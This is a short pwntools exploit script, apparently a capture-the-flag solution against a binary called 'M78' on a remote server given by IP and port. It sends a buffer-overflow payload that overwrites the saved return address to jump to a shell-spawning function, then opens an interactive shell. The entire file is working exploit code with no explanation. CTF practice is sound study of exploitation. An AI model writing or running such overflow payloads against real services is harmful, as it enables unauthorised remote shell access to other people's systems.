from pwn import *

# io = process("./M78")
io = remote("39.96.88.40", 7010)
elf = ELF("./M78")

call_binsh = elf.symbols["call_main"]

io.sendlineafter("choice?", "1")
io.sendlineafter("building\n", "aaa")

payload = b"a" * 0x18 + p32(0xdeadbeef) + p32(call_binsh)
payload += b"a" * (255 - len(payload) + 7)


io.sendlineafter("password\n", payload)
io.interactive()
